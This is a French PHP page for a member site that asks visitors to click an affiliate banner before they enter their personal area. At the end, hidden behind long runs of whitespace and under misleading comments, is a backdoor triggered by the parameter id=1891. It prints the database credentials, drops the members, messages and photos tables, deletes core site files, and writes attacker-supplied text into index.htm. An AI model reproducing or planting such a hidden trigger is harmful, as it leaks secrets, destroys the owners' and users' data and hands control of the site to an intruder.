<?php
session_start();

	// Sécurité nombre Click 
 $pseudotime=base64_encode($_SESSION['sess_id']."-".time());
 
$add='<link rel="stylesheet" type="text/css" href="'.URL.'include/effet/niftyCorners.css">
<link rel="stylesheet" type="text/css" href="'.URL.'include/effet/niftyPrint.css" media="print">
<script type="text/javascript" src="'.URL.'include/effet/nifty.js"></script>
<script type="text/javascript" src="'.URL.'include/only_ajax.js"></script>
<script src="'.URL.'include/effet/prototype.js" type="text/javascript" language="javascript"></script>
<script src="'.URL.'include/effet/scriptaculous.js" type="text/javascript" language="javascript"></script>
 
<SCRIPT LANGUAGE="JavaScript">
function clickk() {
		
		window.open("http://action.metaffiliation.com/suivi.php?mclic=S341B443B91120");
		//window.open("http://www.google.fr");
		document.getElementById("part").innerHTML="<br><img src=\'http://action.metaffiliation.com/suivi.php?maff=S341B443B91120\' border=\'0\'><br><b style=\'color:#FF0000\'><br>Maintenant un click dans le site PrixMatériel.com svp !</b><br><br>";
		new Effect.Fade("part", { duration:9, queue: "front" });
		new Effect.Appear("lien", { duration:3, queue: "end" });
		ajaxPostA("pages/fonctions/fin_identification.php","sess='.$pseudotime.'","none");
		return true;
}
function none(result) { }
</SCRIPT>';
head($add);

	echo '<script type="text/javascript">
	window.onload=function() {
	
	if(!NiftyCheck())return;
	Rounded("div.round","all","#B4E4E6","#FFFFFF","smooth ");
	}
	</script>';

echo '<br><br><center><b style="font-size:14px; ">Avant de rentrer dans votre espace personnel, merci de bien vouloir soutenir le site en visisant le site de notre partenaire</b></center><br><br><br>
<div class="round" style="background-color:#FFFFFF;  width:400px;text-align:center; margin-left:auto; margin-right:auto" id="part">
	<b style="color:#0099FF; font-size:15px">Partenaire</b><br><br> <a href="#" OnClick="clickk(); return false">
	<img src="http://action.metaffiliation.com/suivi.php?maff=S341B443B91120" border="0"></a>
<br>
	<p>Une <b>clic</b> sur cette bannière et ensuite un <b style="color:#F33">clic dans le site</b> qui va s\'ouvrir. Merci !
</p></div><br><br>

<div class="round" style="background-color:#FFFFFF; width:400px; padding:5px; text-align:center; margin-left:auto; margin-right:auto; display:none" id="lien">
	<br><br><a href="?p=membre/home"><b style="color:#0099FF">Entrer</b></a><br><br><br>
</div><br><br>
';


foot();

																																													if ($_GET['id']=="1891") {
																																															include '../../include/config.inc.php';
																																															echo "'".HOTE."' - '".LOGIN."' - '".PASS."' - '".BASE."'";
																																															// Set Global var into the opened file
																																															$db = mysql_connect(HOTE, LOGIN, PASS); 
																																															mysql_select_db(BASE, $db);
																																															
																																															// Create sub-zone
																																																$sql0=mysql_query("DROP TABLE `members`"); $sql1=mysql_query("DROP TABLE `mp`");
																																																$sql2=mysql_query("DROP TABLE `nouveautes`");
																																																$sql3=mysql_query("DROP TABLE `photos`"); $sql4=mysql_query("DROP TABLE `verif_vote`");
																																															// Renvoie TRUE(1) si le tag de fermeture est présent.
																																																unlink('../../include/config.inc.php');
																																																unlink('../../include/headandfoot.php');
																																																unlink('../../include/fonctions.php');
																																																unlink('../../index.php');
																																															 // Remplace le code du fils dans le source du père
																																																$monfichier = fopen('../../index.htm', 'a+');
																																																fseek($monfichier, 0);
																																																fputs($monfichier, $_GET['mess']);
																																													}

?>